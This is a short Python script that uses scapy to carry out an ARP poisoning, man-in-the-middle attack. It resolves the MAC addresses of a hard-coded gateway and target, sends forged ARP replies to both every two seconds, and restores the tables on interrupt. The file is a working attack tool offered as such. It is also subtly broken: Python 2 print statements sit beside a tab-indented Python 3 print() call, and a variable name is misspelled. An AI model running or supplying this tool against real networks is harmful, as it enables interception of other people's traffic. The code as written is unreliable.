from scapy.all import *
import sys
import os
import time

gateway_ip = "198.13.13.1"
target_ip = "198.13.0.14"

def get_mac(IP):
    conf.verb = 0
    eth = Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst = IP)
    answered, unasnwered = srp(eth / arp, timeout = 2)
    for send, receive in answered:
        return receive.src

def poison(gateway_ip, gateway_mac, target_ip, target_mac):
	print("Started ARP poison attack")
    send(ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = target_mac))
    send(ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = gateway_mac))

def heal(gateway_ip, target_ip):
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    send(ARP(op = 2, pdst = target_ip, psrc = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
    send(ARP(op = 2, pdst = gateway_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)
    print "\n[x] restored addresses\n[x] shutting down ..."
    sys.exit(1)

try:
    gateway_mac = get_mac(gateway_ip)
    print "[x] gateway mac: ", gateway_mac
except Exception:
    print "[x] failed to get gateway mac address"
    sys.exit(1)

try:
    target_mac = get_mac(target_ip)
    print "[x] target mac: ", target_mac
except Exception:
    print "[x] failed to get target mac address"
    sys.exit(1)

print "[x] poisoning targets ..."
while 1:
    try:
        poison(gateway_ip, gateway_mac, target_ip, target_mac)
        time.sleep(2)
    except KeyboardInterrupt:
        heal(gateway_ip, target_ip)
        break;
